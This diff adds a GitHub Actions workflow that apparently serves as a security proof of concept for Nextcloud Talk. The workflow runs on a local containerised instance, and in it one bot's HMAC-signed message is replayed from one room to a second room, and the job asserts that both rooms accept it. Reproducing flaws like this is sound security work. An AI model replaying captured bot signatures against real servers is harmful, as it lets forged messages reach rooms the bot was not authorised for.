@@ -1,0 +1,118 @@
+name: Live bot room replay integration
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - security-ci/live-bot-room-replay
+
+permissions:
+  contents: read
+
+jobs:
+  two-room-replay:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - name: Check out Talk source
+        uses: actions/checkout@v4
+
+      - name: Start MariaDB
+        run: |
+          docker network create nc-test
+          docker run -d --name nc-db --network nc-test \
+            -e MARIADB_ROOT_PASSWORD=rootpass \
+            -e MARIADB_DATABASE=nextcloud \
+            -e MARIADB_USER=nextcloud \
+            -e MARIADB_PASSWORD=nextcloud \
+            mariadb:11.4
+          for i in $(seq 1 90); do
+            if docker exec nc-db healthcheck.sh --connect --innodb_initialized >/dev/null 2>&1; then
+              break
+            fi
+            sleep 2
+          done
+          docker exec nc-db healthcheck.sh --connect --innodb_initialized
+
+      - name: Start isolated Nextcloud 36 instance
+        run: |
+          docker run -d --name nextcloud --network nc-test -p 8080:80 \
+            -e MYSQL_HOST=nc-db \
+            -e MYSQL_DATABASE=nextcloud \
+            -e MYSQL_USER=nextcloud \
+            -e MYSQL_PASSWORD=nextcloud \
+            -e NEXTCLOUD_ADMIN_USER=admin \
+            -e NEXTCLOUD_ADMIN_PASSWORD=adminpass \
+            -e NEXTCLOUD_TRUSTED_DOMAINS=localhost \
+            nextcloud:36-apache
+          for i in $(seq 1 180); do
+            if curl -fsS http://127.0.0.1:8080/status.php >/dev/null; then
+              break
+            fi
+            sleep 3
+          done
+          curl -fsS http://127.0.0.1:8080/status.php
+
+      - name: Install this Talk checkout into Nextcloud
+        run: |
+          docker exec nextcloud mkdir -p /var/www/html/custom_apps/spreed
+          docker cp "$GITHUB_WORKSPACE/." nextcloud:/var/www/html/custom_apps/spreed/
+          docker exec -u root nextcloud chown -R www-data:www-data /var/www/html/custom_apps/spreed
+          docker exec -u www-data nextcloud php occ app:enable spreed
+
+      - name: Configure one bot in two independent rooms and replay its signed request
+        shell: bash
+        run: |
+          set -euo pipefail
+          occ() { docker exec -u www-data nextcloud php occ "$@"; }
+
+          ROOM_A_OUTPUT="$(occ talk:room:create ReplayRoomA --owner=admin)"
+          ROOM_B_OUTPUT="$(occ talk:room:create ReplayRoomB --owner=admin)"
+          TOKEN_A="$(printf '%s\n' "$ROOM_A_OUTPUT" | awk '/Room token:/ {print $3}')"
+          TOKEN_B="$(printf '%s\n' "$ROOM_B_OUTPUT" | awk '/Room token:/ {print $3}')"
+          test -n "$TOKEN_A"
+          test -n "$TOKEN_B"
+          test "$TOKEN_A" != "$TOKEN_B"
+
+          SECRET="$(openssl rand -hex 32)"
+          BOT_OUTPUT="$(occ talk:bot:install ReplayBot "$SECRET" https://bot.example.invalid/webhook --feature=response)"
+          BOT_ID="$(printf '%s\n' "$BOT_OUTPUT" | awk '/^ID:/ {print $2}')"
+          test -n "$BOT_ID"
+          occ talk:bot:setup "$BOT_ID" "$TOKEN_A" "$TOKEN_B"
+
+          RANDOM_VALUE="$(openssl rand -hex 32)"
+          MESSAGE="cross-room-replay-$(openssl rand -hex 8)"
+          SIGNATURE="$(printf '%s' "${RANDOM_VALUE}${MESSAGE}" | openssl dgst -sha256 -hmac "$SECRET" | awk '{print $NF}')"
+          BASE_URL="http://127.0.0.1:8080/ocs/v2.php/apps/spreed/api/v1/bot"
+
+          send_signed_message() {
+            local token="$1"
+            curl --silent --show-error --output /tmp/response-"$token".json \
+              --write-out '%{http_code}' \
+              --request POST "$BASE_URL/$token/message" \
+              --header 'OCS-APIRequest: true' \
+              --header "x-nextcloud-talk-bot-random: $RANDOM_VALUE" \
+              --header "x-nextcloud-talk-bot-signature: $SIGNATURE" \
+              --data-urlencode "message=$MESSAGE"
+          }
+
+          STATUS_A="$(send_signed_message "$TOKEN_A")"
+          echo "Original signed request to room A: HTTP $STATUS_A"
+          test "$STATUS_A" = "201"
+
+          # Replay the exact same random value, message and HMAC against room B.
+          STATUS_B="$(send_signed_message "$TOKEN_B")"
+          echo "Replayed identical signed request to room B: HTTP $STATUS_B"
+          cat /tmp/response-"$TOKEN_B".json
+          test "$STATUS_B" = "201"
+
+          echo "CONFIRMED: the exact same bot HMAC was accepted by both room endpoints."
+          echo "Room A token: $TOKEN_A"
+          echo "Room B token: $TOKEN_B"
+          echo "Message marker: $MESSAGE"
+
+      - name: Dump server logs on failure
+        if: failure()
+        run: |
+          docker logs nextcloud || true
+          docker logs nc-db || true
